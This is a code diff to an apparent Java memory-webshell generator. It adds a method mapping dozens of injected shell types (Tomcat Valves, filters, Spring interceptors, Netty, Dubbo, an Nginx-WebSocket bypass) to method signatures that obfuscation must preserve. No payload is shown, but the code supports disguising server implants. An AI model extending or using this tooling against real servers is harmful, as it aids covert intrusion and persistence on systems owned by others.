@@ -5,6 +5,8 @@ import com.reajason.javaweb.memshell.ShellTypeSuffix;
 import com.reajason.javaweb.memshell.config.InjectorConfig;
 import com.reajason.javaweb.memshell.config.ShellConfig;
 import com.reajason.javaweb.memshell.config.ShellToolConfig;
+import com.reajason.javaweb.memshell.obfuscation.MethodContracts;
+import com.reajason.javaweb.memshell.obfuscation.MethodSignature;
 import com.reajason.javaweb.utils.NameSampler;
 import com.reajason.javaweb.utils.StringUtils;
 import com.reajason.javaweb.utils.tuple.Pair;
@@ -13,6 +15,8 @@ import java.util.Collections;
 import java.util.LinkedHashMap;
 import java.util.Map;
 import java.util.Set;
+
+import static com.reajason.javaweb.memshell.ShellType.*;
 
 /**
  * @author ReaJason
@@ -31,6 +35,92 @@ public abstract class AbstractServer {
 
     public Class<?> getListenerInterceptor() {
         return null;
+    }
+
+    /**
+     * 获取特定 shellType 下不可被混淆改名的方法契约（系统契约）。
+     * <p>
+     * 默认覆盖所有内置 shellType：壳类型本身就决定了容器回调入口（Filter/Servlet/Valve/
+     * WebSocket/Interceptor/Netty/Dubbo 等），与具体中间件无关，因此无需每个 Server 重复声明。
+     * 未知或为空的 shellType 返回 {@link MethodContracts#CONSERVATIVE} 兜底。
+     * <p>
+     * 唯一例外是 {@code Handler}/{@code JakartaHandler}：Jetty 与 Undertow 的入口方法不同，
+     * 由对应 Server 覆写本方法，先单独判断 Handler 类型，再调用 {@code super} 复用默认映射。
+     */
+    public Set<MethodSignature> getShellMethodContracts(String shellType) {
+        if (shellType == null) {
+            return MethodContracts.CONSERVATIVE;
+        }
+        switch (shellType) {
+            case FILTER:
+            case JAKARTA_FILTER:
+            case AGENT_FILTER_CHAIN:
+            case WAS_AGENT_FILTER_MANAGER:
+                return MethodContracts.FILTER_CONTRACTS;
+            case LISTENER:
+            case JAKARTA_LISTENER:
+                return MethodContracts.LISTENER_CONTRACTS;
+            case SERVLET:
+            case JAKARTA_SERVLET:
+                return MethodContracts.SERVLET_CONTRACTS;
+            case VALVE:
+            case JAKARTA_VALVE:
+            case PROXY_VALVE:
+            case JAKARTA_PROXY_VALVE:
+            case CATALINA_AGENT_CONTEXT_VALVE:
+            // BypassNginxWebSocket 的实际 shell 是 TomcatWsBypassValve，入口是 Valve.invoke
+            case BYPASS_NGINX_WEBSOCKET:
+            case JAKARTA_BYPASS_NGINX_WEBSOCKET:
+                return MethodContracts.VALVE_CONTRACTS;
+            case WEBSOCKET:
+            case JAKARTA_WEBSOCKET:
+                return MethodContracts.WEBSOCKET_CONTRACTS;
+            case UPGRADE:
+                return MethodContracts.UPGRADE_CONTRACTS;
+            // Handler 入口因中间件而异（Jetty handle / Undertow handleRequest），默认保守兜底
+            case HANDLER:
+            case JAKARTA_HANDLER:
+                return MethodContracts.CONSERVATIVE;
+            case JETTY_AGENT_HANDLER:
+                return MethodContracts.JETTY_HANDLER_CONTRACTS;
+            case CUSTOMIZER:
+                return MethodContracts.JETTY_CUSTOMIZER_CONTRACTS;
+            case UNDERTOW_AGENT_SERVLET_HANDLER:
+                return MethodContracts.UNDERTOW_HANDLER_CONTRACTS;
+            case SPRING_WEBMVC_INTERCEPTOR:
+            case SPRING_WEBMVC_JAKARTA_INTERCEPTOR:
+                return MethodContracts.SPRING_INTERCEPTOR_CONTRACTS;
+            case SPRING_WEBMVC_CONTROLLER_HANDLER:
+            case SPRING_WEBMVC_JAKARTA_CONTROLLER_HANDLER:
+                return MethodContracts.SPRING_CONTROLLER_CONTRACTS;
+            case SPRING_WEBMVC_AGENT_FRAMEWORK_SERVLET:
+                return MethodContracts.SPRING_FRAMEWORK_SERVLET_CONTRACTS;
+            case SPRING_WEBFLUX_WEB_FILTER:
+                return MethodContracts.SPRING_WEBFLUX_FILTER_CONTRACTS;
+            case SPRING_WEBFLUX_HANDLER_METHOD:
+                return MethodContracts.SPRING_WEBFLUX_HANDLER_METHOD_CONTRACTS;
+            case SPRING_WEBFLUX_HANDLER_FUNCTION:
+                return MethodContracts.SPRING_WEBFLUX_HANDLER_FUNCTION_CONTRACTS;
+            case NETTY_HANDLER:
+                return MethodContracts.NETTY_HANDLER_CONTRACTS;
+            case DUBBO_SERVICE:
+            case APACHE_DUBBO_SERVICE:
+            case ALIBABA_DUBBO_SERVICE:
+                return MethodContracts.DUBBO_CONTRACTS;
+            case ACTION:
+                return MethodContracts.STRUTS2_CONTRACTS;
+            case WEBLOGIC_AGENT_SERVLET_CONTEXT:
+                return MethodContracts.WEBLOGIC_AGENT_SERVLET_CONTEXT_CONTRACTS;
+            default:
+                return MethodContracts.CONSERVATIVE;
+        }
+    }
+
+    /**
+     * 获取特定 shellType 下注入器不可被混淆改名的方法契约
+     */
+    public Set<MethodSignature> getInjectorMethodContracts(String shellType) {
+        return MethodContracts.INJECTOR_COMMON;
     }
 
     /**
